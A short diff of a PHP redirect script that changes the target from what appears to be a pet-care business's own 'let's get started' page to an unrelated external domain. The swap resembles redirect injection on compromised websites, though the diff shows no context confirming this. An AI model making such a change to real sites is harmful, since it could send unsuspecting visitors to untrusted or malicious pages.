@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.allanimalpetcareservices.com/let-s-get-started");
+header("Location: https://start-your-product.site/actnor");
 die();
 ?>
